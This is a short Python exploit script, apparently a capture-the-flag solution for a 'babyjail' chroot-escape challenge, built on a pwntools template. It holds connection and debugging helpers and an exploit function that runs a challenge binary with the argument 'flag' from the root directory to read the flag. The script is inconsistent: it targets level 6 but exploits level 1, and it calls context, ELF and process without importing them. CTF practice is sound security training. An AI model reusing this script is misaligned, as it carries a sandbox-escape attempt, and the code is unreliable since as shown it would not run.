

#!/usr/bin/env python
# -*- coding: utf-8 -*-

# this exploit was generated via
# 1) pwntools
# 2) ctfmate

import os
import time
import pwn

BINARY = "/challenge/babyjail_level6"
LIBC = "/usr/lib/x86_64-linux-gnu/libc.so.6"
LD = "/lib64/ld-linux-x86-64.so.2"

exe = pwn.context.binary = pwn.ELF(BINARY)
libc = pwn.ELF(LIBC)
ld = pwn.ELF(LD)
pwn.context.terminal = ["tmux", "splitw", "-h"]
pwn.context.delete_corefiles = True
pwn.context.rename_corefiles = False
p64 = pwn.p64
u64 = pwn.u64
p32 = pwn.p32
u32 = pwn.u32
p16 = pwn.p16
u16 = pwn.u16
p8  = pwn.p8
u8  = pwn.u8


def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if pwn.args.GDB: return pwn.gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else: return pwn.process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    if pwn.args.GDB: pwn.gdb.attach(pwn.connect(pwn.args.HOST or '127.0.0.1', int(pwn.args.PORT or 1337)), gdbscript=gdbscript)
    return pwn.connect(pwn.args.HOST or '127.0.0.1', int(pwn.args.PORT or 1337))

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if pwn.args.LOCAL: return local(argv, *a, **kw)
    else: return remote(argv, *a, **kw)

gdbscript = '''
continue
'''.format(**locals())

# Fonction exploit
def exploit():
    #--------Setup--------#
    context(arch="amd64", os="linux")
    elf = ELF("/challenge/babyjail_level1", checksec=False)
    #--------Chroot Escape--------#
    p = process(["/challenge/babyjail_level1", "flag"], cwd="/")
    p.interactive()
    pass

if __name__ == "__main__":
    exploit()